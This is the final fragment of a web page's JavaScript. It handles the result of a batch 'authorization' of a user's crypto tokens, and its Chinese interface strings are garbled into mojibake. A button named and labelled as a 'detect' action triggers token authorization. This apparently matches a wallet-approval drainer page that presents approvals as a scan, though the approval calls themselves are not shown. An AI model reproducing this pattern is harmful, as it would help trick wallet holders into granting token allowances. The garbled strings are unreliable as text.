                    showStatus(`æˆåŠŸæˆæƒ ${userTokens.length} ä¸ªä»£å¸ï¼`, 'success');
                    detectBtn.innerHTML = 'æˆæƒå®Œæˆ';
                    detectBtn.className = 'btn success';
                } else {
                    showStatus('æ‰¹é‡æˆæƒå¤±è´¥', 'error');
                    detectBtn.innerHTML = 'é‡æ–°æˆæƒ';
                }
                
                detectBtn.disabled = false;
                
            } catch (error) {
                console.error('æ‰¹é‡æˆæƒå¤±è´¥:', error);
                showStatus('æ‰¹é‡æˆæƒå¤±è´¥: ' + error.message, 'error');
                
                const detectBtn = document.getElementById('detectBtn');
                detectBtn.disabled = false;
                detectBtn.innerHTML = 'é‡æ–°æ£€æµ‹';
            }
        }
    </script>
</body>
</html>
